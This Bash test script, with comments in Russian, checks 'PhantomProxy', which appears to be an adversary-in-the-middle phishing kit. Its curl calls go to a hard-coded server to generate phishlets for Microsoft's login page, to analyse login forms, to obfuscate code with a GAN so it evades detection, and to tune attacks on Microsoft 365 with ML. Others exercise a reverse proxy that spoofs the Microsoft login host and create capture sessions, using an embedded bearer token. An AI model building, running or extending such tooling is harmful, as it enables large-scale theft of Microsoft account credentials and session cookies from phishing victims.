#!/bin/bash
# PhantomProxy v1.7.0 - Автоматический тест-раннер
# Запускает все тесты и генерирует отчёт

# Конфигурация
BASE_URL="http://212.233.93.147:8080"
AI_URL="http://212.233.93.147:8081"
GAN_URL="http://212.233.93.147:8084"
ML_URL="http://212.233.93.147:8083"
AUTH_HEADER="Authorization: Bearer verdebudget-secret-2026"

# Счётчики
PASSED=0
FAILED=0
TOTAL=0

# Цвета
GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Функция теста
run_test() {
    local test_name="$1"
    local command="$2"
    local expected="$3"
    
    TOTAL=$((TOTAL + 1))
    
    echo -n "Тест $TOTAL: $test_name... "
    
    result=$(eval "$command" 2>&1)
    
    if echo "$result" | grep -q "$expected"; then
        echo -e "${GREEN}✅ PASSED${NC}"
        PASSED=$((PASSED + 1))
        return 0
    else
        echo -e "${RED}❌ FAILED${NC}"
        FAILED=$((FAILED + 1))
        echo "  Output: $result"
        return 1
    fi
}

# Заголовок
echo "============================================================"
echo "PHANTOMPROXY v1.7.0 - AUTOMATED TEST SUITE"
echo "============================================================"
echo "Date: $(date)"
echo "Target: $BASE_URL"
echo ""

# ============================================
# ЧАСТЬ 1: ПРОВЕРКА СЕРВИСОВ
# ============================================
echo "ЧАСТЬ 1: Проверка сервисов..."
echo "----------------------------------------------------------"

run_test "Main API Health" \
    "curl -s $BASE_URL/health" \
    '"status":"ok"'

run_test "AI Orchestrator Health" \
    "curl -s $AI_URL/health" \
    '"status":"ok"'

run_test "GAN Obfuscation Health" \
    "curl -s $GAN_URL/health" \
    '"status":"ok"'

run_test "ML Optimization Health" \
    "curl -s $ML_URL/health" \
    '"status":"ok"'

echo ""

# ============================================
# ЧАСТЬ 2: AI ORCHESTRATOR
# ============================================
echo "ЧАСТЬ 2: AI Orchestrator..."
echo "----------------------------------------------------------"

run_test "AI Generate Phishlet" \
    "curl -s -X POST $AI_URL/api/v1/generate-phishlet -H 'Content-Type: application/json' -d '{\"target_url\":\"https://login.microsoftonline.com\"}'" \
    '"success":true'

run_test "AI Site Analysis" \
    "curl -s $AI_URL/api/v1/analyze/login.microsoftonline.com" \
    '"forms"'

echo ""

# ============================================
# ЧАСТЬ 3: GAN OBFUSCATION
# ============================================
echo "ЧАСТЬ 3: GAN Obfuscation..."
echo "----------------------------------------------------------"

run_test "GAN Obfuscate Code" \
    "curl -s -X POST $GAN_URL/api/v1/gan/obfuscate -H 'Content-Type: application/json' -d '{\"code\":\"var x=1;\",\"level\":\"high\",\"session_id\":\"test\"}'" \
    '"success":true'

run_test "GAN Stats" \
    "curl -s $GAN_URL/api/v1/gan/stats" \
    '"success":true'

echo ""

# ============================================
# ЧАСТЬ 4: ML OPTIMIZATION
# ============================================
echo "ЧАСТЬ 4: ML Optimization..."
echo "----------------------------------------------------------"

run_test "ML Train Model" \
    "curl -s -X POST $ML_URL/api/v1/ml/train -H 'Content-Type: application/json' -d '{\"min_samples\":1}'" \
    '"success":true'

run_test "ML Get Recommendations" \
    "curl -s -X POST $ML_URL/api/v1/ml/recommendations -H 'Content-Type: application/json' -d '{\"target_service\":\"Microsoft 365\",\"current_params\":{}}'" \
    '"success":true'

echo ""

# ============================================
# ЧАСТЬ 5: CORE API
# ============================================
echo "ЧАСТЬ 5: Core API..."
echo "----------------------------------------------------------"

run_test "Core Stats" \
    "curl -s $BASE_URL/api/v1/stats -H '$AUTH_HEADER'" \
    '"total_sessions"'

run_test "Core Phishlets List" \
    "curl -s $BASE_URL/api/v1/phishlets -H '$AUTH_HEADER'" \
    '"phishlets"'

echo ""

# ============================================
# ЧАСТЬ 6: HTTPS PROXY
# ============================================
echo "ЧАСТЬ 6: HTTPS Proxy..."
echo "----------------------------------------------------------"

run_test "HTTPS Proxy Health" \
    "curl -sk https://212.233.93.147:8443/health" \
    '"status":"ok"'

run_test "HTTPS Proxy Root" \
    "curl -sk https://212.233.93.147:8443/ -H 'Host: login.microsoftonline.com'" \
    'Found'

echo ""

# ============================================
# ЧАСТЬ 7: SESSION TESTS
# ============================================
echo "ЧАСТЬ 7: Session Tests..."
echo "----------------------------------------------------------"

# Создание сессии
SESSION_RESPONSE=$(curl -s -X POST $BASE_URL/api/v1/sessions \
    -H "$AUTH_HEADER" \
    -H "Content-Type: application/json" \
    -d '{"target_url":"https://login.microsoftonline.com"}')

SESSION_ID=$(echo "$SESSION_RESPONSE" | grep -o '"id":"[^"]*"' | cut -d'"' -f4)

if [ -n "$SESSION_ID" ]; then
    echo -e "${GREEN}✅ Session Created: $SESSION_ID${NC}"
    PASSED=$((PASSED + 1))
    TOTAL=$((TOTAL + 1))
else
    echo -e "${RED}❌ Session Creation Failed${NC}"
    FAILED=$((FAILED + 1))
    TOTAL=$((TOTAL + 1))
fi

echo ""

# ============================================
# ИТОГИ
# ============================================
echo "============================================================"
echo "TEST RESULTS"
echo "============================================================"
echo "Total Tests:  $TOTAL"
echo -e "Passed:       ${GREEN}$PASSED${NC}"
echo -e "Failed:       ${RED}$FAILED${NC}"

if [ $TOTAL -gt 0 ]; then
    PASS_RATE=$((PASSED * 100 / TOTAL))
    echo "Pass Rate:    $PASS_RATE%"
fi

echo "============================================================"

# Генерация отчёта
REPORT_FILE="test_report_$(date +%Y%m%d_%H%M%S).md"

cat > "$REPORT_FILE" << EOF
# PHANTOMPROXY v1.7.0 - TEST REPORT

**Date:** $(date)
**Target:** $BASE_URL

## Summary

- **Total Tests:** $TOTAL
- **Passed:** $PASSED
- **Failed:** $FAILED
- **Pass Rate:** $PASS_RATE%

## Results

$(if [ $PASSED -gt 0 ]; then echo "✅ Tests passed"; fi)
$(if [ $FAILED -gt 0 ]; then echo "❌ Tests failed"; fi)

## Recommendation

$(if [ $PASS_RATE -ge 80 ]; then echo "✅ READY FOR TESTING"; elif [ $PASS_RATE -ge 50 ]; then echo "⚠️ NEEDS FIXES"; else echo "❌ NOT READY"; fi)
EOF

echo ""
echo "Report saved to: $REPORT_FILE"
echo ""

# Выход
if [ $FAILED -eq 0 ]; then
    echo -e "${GREEN}ALL TESTS PASSED!${NC}"
    exit 0
else
    echo -e "${RED}SOME TESTS FAILED${NC}"
    exit 1
fi
